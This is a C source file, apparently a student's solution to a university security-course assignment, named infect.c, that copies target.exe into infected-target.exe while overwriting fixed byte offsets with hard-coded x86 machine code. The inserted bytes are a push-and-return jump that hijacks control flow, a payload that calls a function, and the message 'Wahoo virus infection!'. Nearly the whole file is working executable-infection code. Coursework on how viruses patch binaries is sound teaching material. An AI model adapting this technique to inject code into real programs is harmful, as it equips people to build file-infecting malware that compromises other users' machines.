/*
Jennifer Long
CS 4630 Assignment 4
10/11/2018
infect.c
*/

#include <stdio.h>
#include <ctype.h>

void infectFile(const char *filename, const char *newFilename);

int main() {
  const char *filename = "target.exe";
  const char *newFilename = "infected-target.exe";
  infectFile(filename, newFilename);
  return 0;
}

void infectFile(const char *filename, const char *newFilename) {
  unsigned char trickyJump[7] = {0x68, 0x54, 0x84, 0x04, 0x08,
                                0xC3, 0X90};
  unsigned char payload[14] = {0x68, 0x6F, 0x84, 0x04, 0x08,
                              0xE8, 0x84, 0xFE, 0xFF, 0xFF,
                              0x83, 0xC4, 0x04,
                              0xC3};
  unsigned char message[24] = {0x57, 0x61, 0x68, 0x6F, 0x6F, 0x20, 0x76, 0x69, 0x72, 0x75, 0x73, 0x20, 0x69, 0x6E, 0x66, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x21, 0x00};
  FILE *infile = fopen(filename, "rb");
  FILE *outfile = fopen(newFilename, "wb");
  if (infile != NULL) {
    int ch;
    int line = 0;

    while ((ch = fgetc(infile)) != EOF) {
      if (line >= 1101 && line <= 1121){
        if(line == 1101) fwrite(trickyJump, sizeof(trickyJump), 1, outfile);
        if(line == 1108) fwrite(payload, sizeof(payload), 1, outfile);
      }
      else if (line >= 1135 && line <= 1158){
        if(line == 1135) fwrite(message, sizeof(message), 1, outfile);
      }
      else{
        fputc(ch, outfile);
      }

      line++;
    }
    fclose(infile);
    fclose(outfile);
  }
}
